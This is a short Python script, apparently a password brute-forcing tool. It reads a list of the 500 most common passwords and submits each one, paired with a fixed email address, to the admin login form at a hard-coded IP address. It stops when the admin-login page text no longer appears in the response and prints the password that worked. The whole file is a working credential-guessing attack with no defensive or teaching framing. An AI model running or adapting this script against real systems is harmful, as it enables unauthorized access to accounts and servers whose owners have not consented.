import requests


def __test__def(payload):
    url = "http://121.36.241.250/login/"
    files = [
    ]
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = requests.request("POST", url, headers=headers, data=payload, files=files)
    text1 = response.text
    return text1


def read_txt(inputpath):
    with open(inputpath, 'r', encoding='utf-8') as infile:
        data2 = []
        for line in infile:
            data_line = line.strip("\n").split()  # 去除首尾换行符，并按空格划分
            data2.append(data_line[0])
        return data2


if __name__ == '__main__':
    list_pass = read_txt('./burnett_top_500.txt')
    for i in list_pass:
        passwd = i
        payload = {'email': 'springbird@qq.com',
                   'password': i}
        text = __test__def(payload)
        if "管理员登录" not in text:
            print(i)
            break
        else:
            pass
